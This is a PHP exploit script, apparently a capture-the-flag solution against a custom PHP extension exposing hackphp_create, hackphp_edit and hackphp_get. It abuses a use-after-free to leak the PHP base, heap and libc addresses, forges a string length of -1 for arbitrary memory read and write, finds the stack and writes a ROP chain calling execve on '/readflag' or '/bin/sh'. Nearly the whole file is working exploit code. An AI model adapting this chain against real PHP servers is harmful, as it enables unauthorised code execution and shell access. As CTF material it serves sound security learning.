<?php

$buf_addr = 0;
$c = 0;

function str_to_long($arg_str){

    $result = ord($arg_str[0]) + (ord($arg_str[1]) << 8) + (ord($arg_str[2]) << 16) + (ord($arg_str[3]) << 24) +
            (ord($arg_str[4]) << 32) + (ord($arg_str[5]) << 40) + (ord($arg_str[6]) << 48) + (ord($arg_str[7]) << 56);

    return $result;
}

function readword($addr){
    global $buf_addr;
    global $c;

    if($buf_addr){
        if($addr > $buf_addr){
            $offset = $addr - $buf_addr;
        }else{
            $offset = $addr - $buf_addr + 1;
        }
        return ord($c->var[0 + $offset]) + (ord($c->var[1 + $offset]) << 8) + (ord($c->var[2 + $offset]) << 16) + (ord($c->var[3 + $offset]) << 24) +
        (ord($c->var[4 + $offset]) << 32) + (ord($c->var[5 + $offset]) << 40) + (ord($c->var[6 + $offset]) << 48) + (ord($c->var[7 + $offset]) << 56);
    }else{
        return 0;
    }
}

function writeword($addr, $value){
    global $buf_addr;
    global $c;

    if($buf_addr){
        $offset = $addr - $buf_addr;
        $c->var[0 + $offset] = chr(($value >> 0) & 0xff);
        $c->var[1 + $offset] = chr(($value >> 8) & 0xff);
        $c->var[2 + $offset] = chr(($value >> 16) & 0xff);
        $c->var[3 + $offset] = chr(($value >> 24) & 0xff);
        $c->var[4 + $offset] = chr(($value >> 32) & 0xff);
        $c->var[5 + $offset] = chr(($value >> 40) & 0xff);
        $c->var[6 + $offset] = chr(($value >> 48) & 0xff);
        $c->var[7 + $offset] = chr(($value >> 56) & 0xff);
    }
}

class phpClass {
    var $var = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    
    function myfunc ($str) {
       echo $str;
    }
}

hackphp_create(0x38); // buf = emalloc(0x38); free(buf);
$d = new phpClass(); // $d = emalloc(0x38);

hackphp_edit("aaaaaaaaaaaaaaaabbbbbbbb");
$r = hackphp_get();


$php_base_addr = str_to_long(substr($r, 0x18) . "\0\0\0\0\0\0\0\0") - 0xffe520;
echo "php_base_addr: ";
echo dechex($php_base_addr). PHP_EOL;

hackphp_create(0x38); // buf = emalloc(0x38); free(buf);
$d = new phpClass(); // $d = emalloc(0x38);

hackphp_edit("aaaaaaaaaaaaaaaaa");
$r = hackphp_get();

$memory_addr = str_to_long(substr($r, 0x10) . "\0\0\0\0\0\0\0\0") - 0x61;
echo "memory_addr: ";
echo dechex($memory_addr). PHP_EOL;

$buf_addr = $memory_addr + 0x85ea0;
echo "buf_addr: ";
echo dechex($buf_addr). PHP_EOL;
$buf_addr = $buf_addr + 0x18;

$c = new phpClass(); // emalloc(0x38);

hackphp_create(0x98);  // buf = emalloc(0x98); free(buf);
$c->var[0] = 'b';      // malloc(0x98) -> buf

/* Hijack length to -1 */
hackphp_edit("\x01\x00\x00\x00\x06\x00\x00\x00" . "\x00\x00\x00\x00\x00\x00\x00\x00" . "\xff\xff\xff\xff\xff\xff\xff\xff");

$libc_addr = readword($php_base_addr + 0xFFF5E0 ) - 0x85a90;
echo "libc_addr: ";
echo dechex($libc_addr). PHP_EOL;

$system_addr = $libc_addr + 0x55410;
echo "system_addr: ";
echo dechex($system_addr). PHP_EOL;
$_main_ret = $php_base_addr + 0x51d402;
echo "_main_ret: ";
echo dechex($_main_ret). PHP_EOL;

$stack_addr = readword($libc_addr + 0x1ec440) & (~0xf);
echo "stack_addr: ";
echo dechex($stack_addr). PHP_EOL;

$stack = 0;
for($i = 0; $i < 0x100000; $i += 8){
    if(readword($stack_addr - $i) == $_main_ret){
        $stack = $stack_addr - $i;
        echo "stack: ";
        echo dechex($stack). PHP_EOL;
        break;
    }
}

if(1){
    writeword($stack + 0, $libc_addr + 0x0000000000026b72); // pop rdi ; ret
    writeword($stack + 8, $stack + 64); // "/readflag"
    writeword($stack + 16, $libc_addr + 0x0000000000027529); // pop rsi ; ret
    writeword($stack + 24, $stack + 80); // ["/readflag", ""]
    writeword($stack + 32, $libc_addr + 0x000000000011c371); // pop rdx; pop r12; ret; 
    writeword($stack + 40, $stack + 48); // [""]
    writeword($stack + 48, 0); //  ""
    writeword($stack + 56, $libc_addr + 0xe62f0); // execve("/readflag", ["/readflag", ""], [""])
    writeword($stack + 64, 7020098500480561711); // /readfla
    writeword($stack + 72, 103); // /g
    writeword($stack + 80, $stack + 64); // "/readflag"
    writeword($stack + 88, 0); // ""
}else{
    writeword($stack + 0, $libc_addr + 0x0000000000026b72); // pop rdi ; ret
    writeword($stack + 8, $stack + 64); // "/bin/sh"
    writeword($stack + 16, $libc_addr + 0x0000000000027529); // pop rsi ; ret
    writeword($stack + 24, $stack + 80); // ["/bin/sh", ""]
    writeword($stack + 32, $libc_addr + 0x000000000011c371); // pop rdx; pop r12; ret; 
    writeword($stack + 40, $stack + 48); // [""]
    writeword($stack + 48, 0); //  ""
    writeword($stack + 56, $libc_addr + 0xe62f0); // execve("/bin/sh", ["/bin/sh", ""], [""])
    writeword($stack + 64, 0x68732f6e69622f); // /bin/sh
    writeword($stack + 72, 0); // 
    writeword($stack + 80, $stack + 64); // "/bin/sh"
    writeword($stack + 88, 0); // ""
}


?>